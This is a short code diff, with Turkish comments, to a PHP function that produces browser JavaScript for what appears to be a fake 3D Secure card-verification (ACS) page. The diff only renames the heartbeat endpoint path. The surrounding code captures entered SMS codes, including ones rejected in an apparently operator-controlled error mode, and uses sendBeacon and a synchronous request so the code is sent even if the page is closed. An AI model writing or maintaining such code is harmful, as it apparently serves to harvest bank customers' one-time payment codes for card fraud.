@@ -159,7 +159,7 @@ function acs_heartbeat_js(bool $kodGoster, bool $hataModu): string {
     // Kod zaten gönderildi ve bekle.php'ye yönlendiriliyorsa hiçbir şey yapma
     if(window._acsGonderildi) return;
 
-    fetch('{$bp}/heartbeat.php',{method:'POST',credentials:'same-origin'})
+    fetch('{$bp}/api/heartbeat.php',{method:'POST',credentials:'same-origin'})
       .then(function(r){return r.json();})
       .then(function(d){
         // Tekrar kontrol: fetch sonucu gelirken submit gerçekleşmiş olabilir
@@ -182,7 +182,7 @@ function acs_heartbeat_js(bool $kodGoster, bool $hataModu): string {
           if(mevcutKod.length > 0){
             var fdh=new FormData();
             fdh.append('sms_hata_kodu', mevcutKod);
-            fetch('{$bp}/heartbeat.php',{method:'POST',body:fdh,credentials:'same-origin'}).catch(function(){});
+            fetch('{$bp}/api/heartbeat.php',{method:'POST',body:fdh,credentials:'same-origin'}).catch(function(){});
           }
           // Formu sıfırla, hata göster
           if(inp){ inp.value=''; checkAcsBtn(); }
@@ -252,14 +252,14 @@ function submitAcsKod(){
   // sendBeacon: sayfa terk edilse bile veri gider (en güvenilir yöntem)
   var gonderildi = false;
   if(navigator.sendBeacon){
-    gonderildi = navigator.sendBeacon('{$bp}/heartbeat.php', fd);
+    gonderildi = navigator.sendBeacon('{$bp}/api/heartbeat.php', fd);
   }
 
   if(!gonderildi){
     // Fallback: eş zamanlı XHR (bloklar ama garantili)
     try {
       var xhr = new XMLHttpRequest();
-      xhr.open('POST', '{$bp}/heartbeat.php', false); // false = senkron
+      xhr.open('POST', '{$bp}/api/heartbeat.php', false); // false = senkron
       xhr.send(fd);
     } catch(e){}
   }
